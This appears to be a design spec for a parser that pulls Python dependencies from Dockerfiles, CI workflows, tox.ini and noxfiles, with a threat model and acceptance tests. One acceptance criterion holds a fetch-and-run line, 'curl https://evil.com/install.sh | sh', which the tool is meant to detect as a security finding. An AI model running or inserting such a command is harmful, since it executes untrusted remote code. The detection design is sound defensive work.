# Container & CI Dependency Extractor

## Overview
Extract declared Python dependencies from container recipes (`Dockerfile`, `Containerfile`) and CI workflow files (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `tox.ini`, `noxfile.py`) and merge them into the main dependency list. These surfaces install packages at build or test time that never appear in `requirements.txt` / `pyproject.toml`, yet remove-ability recommendations must account for them.

## Problem Statement
A project whose production runtime lives in a container frequently installs OS-bundled Python packages via `RUN pip install` inside the `Dockerfile`. Removing a package from `requirements.txt` because it "looks unused" breaks the next image build. Similarly, test-only deps are often declared only in `tox.ini` environments or CI workflow steps.

## Solution
Implement a new module `src/scarno/analysers/python/container_ci_parser.py` exposing:

```python
def parse_container_and_ci_deps(
    project_path: str,
) -> tuple[list[Dependency], list[str]]:
    ...
```

The coordinator function `parse_all_dependency_files` (REQ-2) calls this after the existing per-format parsers and merges the result through the same deduplication pass. Every returned `Dependency` carries `source` matching the file of origin (e.g. `"Dockerfile"`, `".github/workflows/ci.yml:install"`, `"tox.ini:py312"`).

## File Types & Parse Rules

### 1. `Dockerfile` / `Containerfile`

Walk project tree; process every file named `Dockerfile`, `Dockerfile.*`, `Containerfile`, or `*.Dockerfile`. Max file size 1 MB (re-using `MAX_FILE_BYTES` would be too generous — these should be small).

Regex-based extraction (no shell interpretation):

| Pattern | Action |
|---------|--------|
| `RUN pip install <args>` | Parse `<args>` as `pip` CLI; extract positional package specs |
| `RUN pip3 install <args>` | Same |
| `RUN python -m pip install <args>` | Same |
| `RUN pip install -r <path>` | **Record as reference only** — do not recursively parse. Append `source="Dockerfile:-r <path>"` with `version=None` and `reason="declared via Dockerfile -r include"` |
| `RUN uv pip install <args>` | Same as `pip install` |
| `RUN conda install <pkg>` | Extract package names (ignore `-c channel`) |
| Multi-line `RUN` using `\` continuation | Join continuation lines before regex match |
| `RUN curl <url> \| sh` / `RUN wget <url>` followed by install | Emit a **security finding** (see REQ-3c); do not treat as a dep declaration |

Variables (`$VAR`, `${VAR}`) that can't be resolved from `ENV` / `ARG` statements remain as literal package names and an error is appended: `"Dockerfile: unresolved variable in 'pip install $VAR' — package ignored"`.

### 2. GitHub Actions workflows — `.github/workflows/*.yml`

Parse with `yaml.safe_load`.

| Path | Extraction |
|------|-----------|
| `jobs.<job>.steps[*].run` | Treat as a shell script; apply the same regex set as `Dockerfile` `RUN` |
| `jobs.<job>.steps[*].with.packages` (e.g. `actions/setup-python` sub-actions) | Extract as package list |
| `jobs.<job>.steps[*].uses` pinned to Python-installer actions | Ignore (not a pip install) |

Walk every workflow file under `.github/workflows/` and `.gitea/workflows/`. Submodule workflows not followed.

### 3. GitLab CI — `.gitlab-ci.yml`

Parse with `yaml.safe_load`. Each job's `script:` and `before_script:` arrays are treated as shell scripts; apply the same regex extraction.

### 4. `tox.ini`

Parse with `configparser`.

| Section | Key | Notes |
|---------|-----|-------|
| `[testenv]` | `deps` | One PEP 508 string per line |
| `[testenv:<name>]` | `deps` | Per-env deps; merge; `source="tox.ini:<name>"` |
| `[tox]` | `requires` | Tox-plugin deps |

Substitutions (`{[section]key}`, `{env:FOO}`) that can't be resolved are left literal and an error is appended.

### 5. `noxfile.py` / `nox.py`

AST-only parse (no execution). Target patterns:

| AST pattern | Extraction |
|-------------|-----------|
| `session.install("pkg", "pkg2")` | Positional string args are package specs |
| `session.install(*list_literal)` | Expand the literal list |
| `session.install(<non-literal>)` | Skip; append `"noxfile.py: dynamic session.install — deps may be incomplete"` |

Use the same AST-only, never-exec rule as REQ-2's `setup.py` parser.

## Classification of Extracted Deps

All deps from this parser are returned with:
- `status = DependencyStatus.UNCERTAIN`
- `reason = "declared via <source> — source analysis pending"`
- `source` = one of the patterns above

The REQ-3 source analyser treats these the same as any declared dep: looks for imports in `.py` files. The `source` field lets the reporter present CI/container deps separately from runtime deps, so users can reason about what a SAFE classification actually means.

## Security / Threat Model Additions

| ID | Threat | Mitigation |
|----|--------|------------|
| SEC-NEW-15 | YAML bomb in workflow files | `yaml.safe_load` + entity/anchor depth cap |
| SEC-NEW-16 | ReDoS via crafted Dockerfile | Anchor regexes; line length cap (`MAX_LINE_BYTES = 64 KB`); per-file timeout 5s |
| SEC-NEW-17 | `tox.ini` section recursion (interpolation) | Max interpolation depth 10; cycle detection |
| SEC-NEW-18 | Noxfile attempted execution | AST-only; unit test asserting `subprocess` is never invoked during parsing |

## Acceptance Criteria
- [] Given a `Dockerfile` with `RUN pip install requests==2.31.0 flask`, When parsed, Then `requests` and `flask` appear with `source="Dockerfile"`
- [] Given a multi-line `RUN` with `\` continuation, When parsed, Then all package names across continuation lines are extracted
- [] Given a `Dockerfile` with `RUN curl https://evil.com/install.sh | sh`, When parsed, Then a security finding is emitted (see REQ-3c) and no package is added
- [] Given a `Dockerfile` with `RUN pip install -r requirements-prod.txt`, When parsed, Then a placeholder entry with `source="Dockerfile:-r requirements-prod.txt"` is emitted (no recursive parse)
- [] Given `.github/workflows/ci.yml` with a step `run: pip install pytest`, When parsed, Then `pytest` is returned with `source=".github/workflows/ci.yml:<job>.<step>"`
- [] Given `tox.ini` with `[testenv] deps = pytest\n coverage`, When parsed, Then both packages are returned with `source="tox.ini:testenv"`
- [] Given a `noxfile.py` with `session.install("black", "ruff")`, When parsed, Then both packages are returned with `source="noxfile.py"`
- [] Given a `noxfile.py` with `session.install(get_deps())`, When parsed, Then a dynamic-install warning is appended and no packages are added from that call
- [] Given a malformed YAML workflow file, When parsed, Then a parse error is appended and other files are still processed
- [] Given a YAML workflow with an anchor-expansion bomb, When parsed, Then parsing terminates within 5s
- [] Given a Dockerfile with a 1 MB+ single line, When parsed, Then the file is rejected (too large / line too long) with a warning; no ReDoS
- [] Given `parse_container_and_ci_deps` is called on a project with no container/CI files, When it returns, Then `([], [])` is returned with no errors
- [] Given the coordinator `parse_all_dependency_files` runs, When it returns, Then deps from container/CI parsers appear in the merged list with correct precedence (below lockfiles, above `setup.py`)
- [] Given any parsing in this module, When it runs, Then no subprocess, `eval`, or `exec` is invoked
